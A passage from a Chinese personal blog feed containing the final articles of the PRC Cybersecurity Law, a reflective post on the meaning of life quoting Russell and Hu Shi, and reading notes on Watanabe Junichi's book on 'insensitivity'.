title="第六十五条"></a><strong>第六十五条</strong></h2><p>关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><h2 id="第六十六条"><a href="#第六十六条" class="headerlink" title="第六十六条"></a><strong>第六十六条</strong></h2><p>关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><h2 id="第六十七条"><a href="#第六十七条" class="headerlink" title="第六十七条"></a><strong>第六十七条</strong></h2><p>违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><h2 id="第六十八条"><a href="#第六十八条" class="headerlink" title="第六十八条"></a><strong>第六十八条</strong></h2><p>网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><h2 id="第六十九条"><a href="#第六十九条" class="headerlink" title="第六十九条"></a><strong>第六十九条</strong></h2><p>网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><h2 id="第七十条"><a href="#第七十条" class="headerlink" title="第七十条"></a><strong>第七十条</strong></h2><p>发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><h2 id="第七十一条"><a href="#第七十一条" class="headerlink" title="第七十一条"></a><strong>第七十一条</strong></h2><p>有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><h2 id="第七十二条"><a href="#第七十二条" class="headerlink" title="第七十二条"></a><strong>第七十二条</strong></h2><p>国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><h2 id="第七十三条"><a href="#第七十三条" class="headerlink" title="第七十三条"></a><strong>第七十三条</strong></h2><p>网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><h2 id="第七十四条"><a href="#第七十四条" class="headerlink" title="第七十四条"></a><strong>第七十四条</strong></h2><p>违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><h2 id="第七十五条"><a href="#第七十五条" class="headerlink" title="第七十五条"></a><strong>第七十五条</strong></h2><p>境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><h1 id="第七章-附则"><a href="#第七章-附则" class="headerlink" title="第七章  附则"></a>第七章  附则</h1><h2 id="第七十六条"><a href="#第七十六条" class="headerlink" title="第七十六条"></a><strong>第七十六条</strong></h2><p>本法下列用语的含义：</p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><h2 id="第七十七条"><a href="#第七十七条" class="headerlink" title="第七十七条"></a><strong>第七十七条</strong></h2><p>存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><h2 id="第七十八条"><a href="#第七十八条" class="headerlink" title="第七十八条"></a><strong>第七十八条</strong></h2><p>军事网络的安全保护，由中央军事委员会另行规定。</p><h2 id="第七十九条"><a href="#第七十九条" class="headerlink" title="第七十九条"></a><strong>第七十九条</strong></h2><p>本法自2017年6月1日起施行。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>回头是岸</title>
      <link href="/mind/180731-philosophical-suicide/"/>
      <url>/mind/180731-philosophical-suicide/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meaning = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> (meaning)</span><br><span class="line">        <span class="comment"># meaning = 0</span></span><br><span class="line">        search_meaning()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        jump_into_real_life()</span><br><span class="line">        work()</span><br><span class="line">        enjoy()</span><br><span class="line">        contribute()</span><br></pre></td></tr></table></figure><p>我开始觉得，人只有不再执着于意义、价值之类的词汇和思考方式，才能去做一些实在的事情，才能融入生活。人应当甘心于局限性，同时欣赏存在本身的不可思议，去体验欲望，去追逐欲望被满足的快乐，去感受欲望不被满足的痛苦，去心平气和地面对存在的短暂，去力所能及地帮助其他存在。</p><p>我逐渐认识到，诚实是最根本的，也是最有力量的。诚实地思考让人摆脱无谓的幻想，有条理地诚实地思考使人不被惯用的思维方式或是语言习惯蒙蔽；诚实的发言常常没什么好处，它最大的作用是保全了诚实的本性，保证一个渴望诚实的人行为的一致性，使其避免自我矛盾带来的痛苦。诚实的思考使人彻底地接受凡人皆有一死，不再费尽心思以各种方式思考与追求永恒不朽云云，不再绞尽脑汁从各种角度论证不朽的可能性。</p><p>计划在这里收集整理一些在我看来值得尊敬的人对生活意义的探讨。</p><h1 id="罗素——爱、知识与慈悲心"><a href="#罗素——爱、知识与慈悲心" class="headerlink" title="罗素——爱、知识与慈悲心"></a>罗素——爱、知识与慈悲心</h1><p> <em><a href="https://www.humanities.mcmaster.ca/~bertrand/misc.html" target="_blank" rel="noopener">WHAT I HAVE LIVED FOR</a></em>    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Description: </span></span><br><span class="line"><span class="comment">This is the prologue to the Autobiography of Bertrand Russell, written on 25 July 1956 in his own hand. The text follows:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PROLOGUE.</span></span><br><span class="line"><span class="comment">WHAT I HAVE LIVED FOR.</span></span><br><span class="line"><span class="comment">Three passions, simple but overwhelmingly strong, have governed my life: the longing for love, the search for knowledge, and unbearable pity for the suffering of mankind. These passions, like great winds, have blown me hither and thither, in a wayward course, over a deep ocean of anguish, reaching to the very verge of despair.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">I have sought love, first, because it brings ecstasy -- ecstasy so great that I would often have sacrificed all the rest of life for a few hours of this joy. I have sought it, next, because it relieves loneliness -- that terrible loneliness in which one shivering consciousness looks over the rim of the world into the cold unfathomable lifeless abyss. I have sought it, finally, because in the union of love I have seen, in a mystic miniature, the prefiguring vision of the heaven that saints and poets have imagined. This is what I sought, and though it might seem too good for human life, this is what -- at last -- I have found.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">With equal passion I have sought knowledge. I have wished to understand the hearts of men. I have wished to know why the stars shine. And I have tried to apprehend the Pythagorean power by which number holds sway above the flux. A little of this, but not much, I have achieved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Love and knowledge, so far as they were possible, led upward toward the heavens. But always pity brought me back to earth. Echoes of cries of pain reverberate in my heart. Children in famine, victims tortured by oppressors, helpless old people a hated burden to their sons, and the whole world of loneliness, poverty, and pain make a mockery of what human life should be. I long to alleviate the evil, but I cannot, and I too suffer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This has been my life. I have found it worth living, and would gladly live it again if the chance were offered me.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Archive Box Number: Black Display Binder</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Date: 1956</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>本人拙劣译文： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">这是《罗素自传》的序，1956年7月25日亲笔。文字如下：</span></span><br><span class="line"><span class="comment">三种简单却极强烈的情感引领着我的生活：对爱的渴望，对知识的渴求和对苦难众生的怜悯。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我最初寻求爱情，因为它带来那种令人愿用余生换取哪怕片刻的狂喜，更因为它消弭独自面对死亡的孤寂。我从爱情中看到诗人们描绘的天堂，听起来有些夸张，但的确如我所见。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">我以同样的热情追求知识，我想理解人心，想明白星空为何闪烁，我试图理解毕达哥拉斯那数字主宰一切的力量。我所得不多，但聊胜于无。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">爱情与知识使我仰望星空，怜悯使我脚踏实地。痛苦的哭声在我心中回荡。饥饿的儿童，被折磨的受压迫者，子孙不孝的无望老人，和整个由孤独、贫穷和苦难构成的世界，无一不是对人类命运的嘲讽。我想要普渡众生，但实际上做不到，因为我也正受着苦难。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这就是我的一生，它值得一过。如果有机会，我愿意重来一遍。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>参考阅读：<a href="http://www.ruanyifeng.com/blog/2011/10/what_I_have_lived_for.html" target="_blank" rel="noopener">《活着的三个理由》</a> </p><h1 id="胡适——社会不朽"><a href="#胡适——社会不朽" class="headerlink" title="胡适——社会不朽"></a>胡适——社会不朽</h1><p><a href="http://www.my285.com/xdmj/hushi/syrs/011.htm" target="_blank" rel="noopener">《我的信仰 》</a> </p><ul><li>胡适，中国新文化运动的开拓者之一。美国《展望》杂志曾经把他列为当今世界有影响力的100 个伟人之一。 </li><li>1891年12月生 ，父亲胡珊是经学家（殁于 1895 年），母亲是观音的虔诚信士（殁于 1918 年）。<code>生长在拜偶像的环境，习于诸神凶恶丑怪的面孔，和天堂地狱的民间传说</code> 。</li><li>1895-1904在村塾读书九年，读习记诵《孝经》、《小学》、四书五经。此间兼读《资治通鉴》、《水浒传》。</li><li>1992年（是年胡适11岁），从接触《小学》引用的司马光的形灭神散论开始怀疑<code>死后审判的观念</code> 。此后不久从《资治通鉴》接触范缜的神灭论及其对因果轮回的反对，很喜欢，从此成了无神论者， <code>摆脱了恶梦似的因果绝对论</code> ，开始相信偶然而非宿命。</li><li>1904-1910在沪六年。<br>接触基本的自然科学、欧洲小说、中国上中古哲学作品，喜欢墨翟的兼爱说和老庄有自然色彩的哲学。从梁启超文字中接触西方哲学，醒悟中国除自然科学和商业外，思想上也不比西方。后读《天演论》、《自由论》，接触进化论，联想起《列子》的天地万物，类无贵贱。<ul><li>1907年（16岁），为《竞业旬报 》 做编辑，<code>猛力攻击人民的迷信，且坦然主张毁弃神道，兼持无神论</code> 。</li><li>1908年（17岁），家道中落，停学一年，先后教授初等英文、国学以补贴家用。</li><li>1909-1910受时事影响，意气消沉，悲观厌世，喝酒作诗，赌博看戏，流浪放荡。一次酒后斗殴进监后，决心脱离现状。苦学一月，<code>前往北京投考用美国退还庚子赔款所设的学额</code> ，是年七月赴美。</li></ul></li><li>1910-1917在美七年。早期意气颓唐，几乎读完圣经，1911年几乎要做基督徒。<ul><li><code>我到美国，满怀悲观。但不久便交结了些朋友，对于那个国家和人民都很喜爱。 美国人出自天真的乐观与朝气给了我很好的印象。在这个地方，似乎无一事一物不 能由人类智力做得成的。我不能避免这种对于人生持有喜气的眼光的传染，数年之 间，就渐渐治疗了我少年老成的态度。</code> </li><li>1914年1月（23岁），日记：<code>我相信我自离开中国后，所学 得的最大的事情，就是这种乐观的人生哲学了。”</code> </li><li>1914年世界大战爆发，为比利时命运所动，又兼接触过老子的“水善应万物而不争”和基督教的《登山宝训》，逐渐信仰不抵抗、平和主义和国际大同主义。</li><li>读易卜生、莫黎和赫胥黎 的著作，相信人应当诚实思考、诚实发言。</li><li>从杜威教授学到<code>人生最神圣的责任是努力思想得好</code> 。</li><li>1915-1917在哥伦比亚大学师从杜威，重读中国古代哲学，成论文《先秦名学史》。</li></ul></li><li>1918年（27岁），其母逝世，促成次年发表《不朽》，总结多年探索得出的人生信条。从检阅父母生平中开始相信一切事物相互影响以致永存，所以一切所作都是不朽。又经过一系列的推想，开始<code>信了可以称为社会不朽的宗教</code> 。小我会死，但其所作所为，无论善恶，都将在大我身上以各种方式传播，以某种形式永垂不朽。</li><li>1923年（32岁）发表《科学与人生观》 ，讲述社会不朽这个<code>“新宇宙观和新人生观的轮廓”</code> 。引发国内思想界长达一年的论战。</li></ul><p>‘科学的人生观’/‘自然主义的人生观’：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">（1 ）根据于天文学和物理学的知识，叫人知道空间的无限之大。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（2 ）根据于地质学及古生物学的知识，叫人知道时间的无穷之长。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（3 ）根据于一切科学，叫人知道宇宙及其中万物的运行变迁皆是自然的，——自己如此的，——正用不着什么超自然的主宰或造物者。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（4 ）根据于生物学的科学知识，叫人知道生物界的生存竞争的浪费与惨酷，——因此叫人更可以明白那“有好生之德”的主宰的假设是不能成立的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（5 ）根据于生物学、生理学、心理学的知识，叫人知道人不过是动物的一种；他和别种动物只有程序的差异，并无种类的区别。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（6 ）根据于生物的科学及人类学、人种学、社会学的知识，叫人知道生物及人类社会演进的历史和演进的原因。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（7 ）根据于生物的及心理的科学，叫人知道一切心理的现象都是有因的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（8 ）根据于生物学及社会学的知识，叫人知道道德礼教是变迁的，而变迁的原因都是可以用科学的方法寻求出来的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（9 ）则根据于新的物理化学的知识，叫人知道物质不是死的，是活的；不是静的，是动的。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">（10）根据于生物学及社会学的知识，叫人知道个人——“小我”——是要死灭的，而人类——“大我”——是不死的，不朽的；叫人知道“为全种万世而生活”就是宗教，就是最高的宗教。而那些替个人谋死后的“天堂”“净土”的宗教，乃是自私自利的宗教。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《钝感力》</title>
      <link href="/mind/180420Insensitivity/"/>
      <url>/mind/180420Insensitivity/</url>
      
        <content type="html"><![CDATA[<p>by 渡边淳一</p><h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><h2 id="迟钝的益处"><a href="#迟钝的益处" class="headerlink" title="迟钝的益处"></a>迟钝的益处</h2><ul><li>抗压能力更强<ul><li>专注创造价值</li><li>充分发挥潜力</li><li>能够坚持不懈 =&gt; 更大的成功概率（事业，爱情）</li></ul></li><li>适应能力更强<ul><li>适应物理环境</li><li>乐观开朗，积极进取</li></ul></li></ul><h2 id="怎样变迟钝"><a href="#怎样变迟钝" class="headerlink" title="怎样变迟钝"></a>怎样变迟钝</h2><h3 id="能做些什么"><a href="#能做些什么" class="headerlink" title="能做些什么"></a>能做些什么</h3><p>眼耳鼻舌身意的敏感程度很大一部分是天生的，难以改变，但是并非完全没有可能。</p><ul><li>磨练。<ul><li>再锋利的刀以合适的角度持续磨砺也会钝化。强光刺目，三秒就瞎，轰鸣入耳，不久渐聋，傻子不起妄念，呆子心如止水。但问题是这样的自虐是否偏离初衷？</li><li>生理上<ul><li>锻炼身体使体魄强健，血液畅流，强化适应环境的能力。</li></ul></li><li>心理上<ul><li>训练专注力：不因敏锐的感官而分神</li><li>参禅打坐，观照冥想？据说刹那有万千念头起灭，自由控制是可能的吗？</li><li>积极的思维方式</li></ul></li></ul></li></ul><h3 id="平衡敏感与迟钝"><a href="#平衡敏感与迟钝" class="headerlink" title="平衡敏感与迟钝"></a>平衡敏感与迟钝</h3><ul><li>毕竟坐怀不乱与不解风情有所不同。</li><li>多思考他人的动机，尝试理解他人语言和行为的出发点。</li><li>少归因到自己身上。</li><li>不忧虑无法改变的事情。</li><li>理论上，一切皆可理解，世事皆可原谅。</li></ul><h3 id="要义"><a href="#要义" class="headerlink" title="要义"></a>要义</h3><ul><li>心无一物是第一义，但不切实际也无意义。</li><li>第二义：恕己容人，淡化情绪，以积极的方式思考和引导自己。</li></ul><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>人生的一大部分乐趣在于体验悲欢，我们的目标并不是练成一块石头。</li><li>​我们需要变得迟钝是因为不希望沉迷细节而失去对全局的掌控。</li><li>我们所谈论的敏锐和迟钝应该是在一个正常区间内的，超出这个区间的就是病，非意志所能左右。</li><li>如果不瞎，那么当一个东西出现在你眼前，你不可能真的看不见。迟钝应该是锻炼自己在意识上忽略它，如果它现在不重要的话。长此以往，形成惯性，只要盯着目标，其余的都将自然而然被忽略。到这时，就可以说是形成了有益的钝感力了。</li></ul><h2 id="评价"><a href="#评价" class="headerlink" title="评价"></a>评价</h2><p>抛去观点不谈，全书论述并不严肃，逻辑也不很严谨，组织有些分散，一时没有读出作者对语言的驾驭能力。当然也可能是翻译不到位的缘故。</p><p>本书带来了一个有价值的概念，并且用案例引发读者思考。但主要是介绍钝感的价值，距离可操作有一定距离。究其原因，是混淆了意志上的钝感和生理上的钝感。作者为了说明钝感的作用与价值，不可避免地将两者煮在一锅。但当我们明白了钝感很重要很有价值后，就会想提高自己的钝感。这时要明白面对生理上的钝感我们是无能为力的，就像男人再努力也觉得分娩可怖，免疫缺陷患者再努力也没法靠意志力抵抗病菌。也许自律神经经过训练可以被控制，但对大部分人来说这几乎是不可能的。</p><p>所以我们所能做的，是在意识可控的层面提高迟钝度。忽略不紧要的，抑制不积极的，始终注意把握全局，坚定彻底地相信自我。</p><p>此外，还可以利用一些心理学上的方法暗示自己。不需要觉得是在自我欺骗，毕竟终究每个念头都未必是真实，那么何不让有益的念头先入为主？</p><h1 id="各章要点"><a href="#各章要点" class="headerlink" title="各章要点"></a>各章要点</h1><h2 id="我们丧失了某种才能"><a href="#我们丧失了某种才能" class="headerlink" title="我们丧失了某种才能"></a>我们丧失了某种才能</h2><ul><li>在各行各业中取得成功的人们，当然拥有才能，但在他们的才能背后，一定隐藏着有益的钝感力。钝感就是一种才能，一种能让人们的才华开花结果，发扬光大的力量。</li><li>钝感的优越<ul><li>迟钝在生理上的意义<ul><li>蚊子叮咬，不抓挠，自然恢复。</li></ul></li><li>愚钝在精神上的意义<ul><li>表现平平的小K被上司怒骂而毫发不损，而不是沉浸其中，自责忧虑。（即时挨骂，也不气馁）</li><li>高才华且强自尊的O先生因退稿而一蹶不振，死气沉沉，恶性循环，再无成名之日。</li></ul></li></ul></li></ul><h2 id="在斥责声中成长的名医"><a href="#在斥责声中成长的名医" class="headerlink" title="在斥责声中成长的名医"></a>在斥责声中成长的名医</h2><ul><li>对健康而言，最为重要的就是让自己全身的血液总是能够顺畅地流淌。因此，做事不要总是思前想后，即使别人说些不中听的话，听完后马上就能抛到脑后。这种有益的钝感，是保证血液畅通无阻的重要原因。</li><li>主任教授不停责骂，S医生频频点头称是。接受责骂，专注领会手术要领。多年后发现S医生以自我为中心，并不认真听人说话，并因此不计较他人言语，从而保持精神安定，心情愉悦。</li><li>控制血管的神经叫做自律神经，应尽量让其保持放松，不去刺激它。</li></ul><h2 id="血液因此畅流"><a href="#血液因此畅流" class="headerlink" title="血液因此畅流"></a>血液因此畅流</h2><ul><li>我们的血管是由自律神经来控制的，拥有有益钝感力的人，其自律神经不易陷入异常的刺激当中，能够让血管一直保持舒张状态，从而使全身的血液可以畅通无阻地流遍全身。</li><li>自律神经<ul><li>交感神经。兴奋。精神上紧张、不安、烦躁；情绪上恼怒、愤恨、憎恶；寒冷。</li><li>副交感神经。舒缓。神清气爽、开怀大笑、环境温暖。</li></ul></li><li>老年人收容所。逗乐老年人以保持其血液流畅；胃溃疡源于精神压力。</li><li>精神压力的益处与害处。</li><li>自律神经努力使身体平衡，有益的钝感力可减轻其负担。</li></ul><h2 id="迟钝的五官"><a href="#迟钝的五官" class="headerlink" title="迟钝的五官"></a>迟钝的五官</h2><ul><li>人们的各种感觉器官若过于敏感的话，会对人产生负面影响。钝感的人和敏感的人相比，前者不会造成器官的消耗，可以更为悠闲自在、胸襟开阔地长寿下去。</li><li>视觉、听觉、嗅觉、味觉、触觉过于敏感带来的痛苦。</li></ul><h2 id="睡眠良好的能人"><a href="#睡眠良好的能人" class="headerlink" title="睡眠良好的能人"></a>睡眠良好的能人</h2><ul><li>睡得香甜，起得迅速，这种睡眠能力正是人的基本能力。没有睡眠能力的话，人们就不能保持健康的身体，就不能专心致志地工作。睡眠良好，这也是一种真正的才能。</li><li><strong>在众多的钝感力当中，能够成为其核心代表的是良好的睡眠。我们称之为“睡眠能力”，这是人们所有的活动和健康的源泉。</strong></li><li>入睡易，起床快可以相对多出六万个小时。</li><li>医生的夜班经历锻炼了作者随时起床的能力。</li><li>随时随地入睡的老太太和失眠的人群。</li><li>若左思右想，也于事无补，不如横下心来，闭眼休息。</li></ul><h2 id="得寸进尺的才能"><a href="#得寸进尺的才能" class="headerlink" title="得寸进尺的才能"></a>得寸进尺的才能</h2><ul><li>有才能的人周围，肯定会有时常表扬他的人，而其本人也常因表扬而得寸进尺，这种“得寸进尺、得意忘形”的精神，不是所谓的卑鄙无耻，而是一种让人朝着光明的未来展翅高飞的原动力。</li><li>人都因鼓舞而奋进。<ul><li>作者因酒保的鼓励而振作</li><li>画家A先生因邻居大婶的鼓励而努力练画</li><li>作者因中学语文老师的鼓励而走上写作道路</li></ul></li><li><strong><em>鼓励可能本身仅仅是鼓励，毕竟酒保不懂文学，大婶不懂艺术，但那种心理上积极 的感受意义非凡！</em></strong></li><li>语言极为重要。一句话既可以救活一个人，也可以杀死一个人。对于才能也是如此。</li><li><strong>人能否成功，不只取决于才能的有无，而在于究竟能把人的才能发掘和引导出来多少，社会上所谓有才能的人，都有一个在适当时期，用适当方法将其才能发掘、引导出来的人。相反，人们口中那些没有才能的人，大多只是由于其潜在的才能没有在适当的时机被发掘和引导出来。</strong></li><li><em>正确地在合适时机表扬孩子。进一步地，<strong>表扬自己</strong>。</em></li></ul><h2 id="肠胃钝感的男人"><a href="#肠胃钝感的男人" class="headerlink" title="肠胃钝感的男人"></a>肠胃钝感的男人</h2><ul><li>贫穷让A童年时多吃了些杂菌，练就坚强肠胃，多年后的一次晚宴后，大家都拉肚子，而他安然无恙。</li><li><em>钝感来自于锻炼，健忘是一副良药。</em></li></ul><h2 id="被爱的女神射中"><a href="#被爱的女神射中" class="headerlink" title="被爱的女神射中"></a>被爱的女神射中</h2><ul><li>在恋爱方面，钝感力也是必不可缺的。特别是当男人追求女人的时候，钝感可以成为一种有力的武器。若再加上诚实，则更如虎添翼。</li><li>男人和女人从根本上就是不同的生物，尤其肉体的原点完全相异。这些差距，不是通过语言上的交谈，就能解决的。</li><li>一位好猎手，只要看准了目标，无论被对方拒绝多少次，也要坚持追求，向女方倾诉自己的衷肠。没有这种坚韧而厚颜的精神，就无法将美丽的猎物捕捉到手。</li><li>其实很多女性都曾说，“就算多少有些不中意，但是在对方不厌其烦的邀请和竭尽全力的追求下，还是逐渐地被对方打开了心扉，或许还会开始喜欢……”</li><li>钝感的应用<ul><li>不屈不挠地追求</li><li>钝感的肠胃</li><li>杂乱的房间</li></ul></li><li>男女双方无论是生长环境、兴趣爱好，还是个人教养、价值观等不可能相同，然而结婚，就是不同的男女在一时热情的怂恿下，共同在一个狭小的家中生活。</li></ul><h2 id="为了维系婚姻生活"><a href="#为了维系婚姻生活" class="headerlink" title="为了维系婚姻生活"></a>为了维系婚姻生活</h2><ul><li>结婚生活就是一条漫长的容忍之路。</li></ul><h2 id="为了战胜癌症"><a href="#为了战胜癌症" class="headerlink" title="为了战胜癌症"></a>为了战胜癌症</h2><ul><li>从癌症的预防到治疗，以及治愈之后回归社会，在所有阶段，最重要的就是保持良好的心态，也就是所谓的钝感力。</li></ul><h2 id="女性的强大之一"><a href="#女性的强大之一" class="headerlink" title="女性的强大之一"></a>女性的强大之一</h2><ul><li>“弱者，你的名字叫男人。”——男性是一种多么诚实、严谨、敏感的性别啊。相比之下，女性则大度、暧昧而钝感。</li><li>男女的钝感力差别<ul><li>一千金，二公子</li><li>女性不怕出血</li></ul></li></ul><h2 id="女性的强大之二"><a href="#女性的强大之二" class="headerlink" title="女性的强大之二"></a>女性的强大之二</h2><ul><li>女性既不怕寒冷，也不怕出血和疼痛。在过去，分娩对于母亲和即将降生的婴儿来说，都是性命攸关的一道坎，女性如何才能闯过此道难关，竭尽全力将孩子生下，使人类得以持久地存在下去呢？为此，造物主想到的就是，将担当分娩重任的女性创造得更为坚韧而强壮。</li><li>不畏严寒。更厚的脂肪层。</li><li>不畏疼痛。分娩的疼痛。男性是靠精神上的力量来忍耐的。与之相比，女性对生理上的那种痛彻心肺的痛苦的忍耐力，却是出人意料的坚强。</li></ul><h2 id="感谢嫉妒和讽刺"><a href="#感谢嫉妒和讽刺" class="headerlink" title="感谢嫉妒和讽刺"></a>感谢嫉妒和讽刺</h2><ul><li>在我们身边，经常会发生被朋友或同事嫉妒、中伤和刁难的事情。不要听到不中听的话就如临大敌，而要仔细思考对方那么说的原因，体察对方的心情。这种心胸宽广的钝感力，可以在我们的日常生活中起到极大的作用。</li><li>被嫉妒是一种肯定。</li><li>讽刺达不到目的。</li></ul><h2 id="恋爱的能力"><a href="#恋爱的能力" class="headerlink" title="恋爱的能力"></a>恋爱的能力</h2><ul><li>喜欢对方，希望将彼此的恋爱关系延续下去的话，就要拥有原谅对方的胸怀。如果希望两个人永远相爱、幸福美满，在某种程度上就要能够原谅对方，钝感一些。这种钝感力，正是让恋爱关系长久维系的能力。</li><li>恋爱的初期，敏感是必要的。</li><li>长期的恋爱，钝感是重要的。</li></ul><h2 id="为了更好地生存"><a href="#为了更好地生存" class="headerlink" 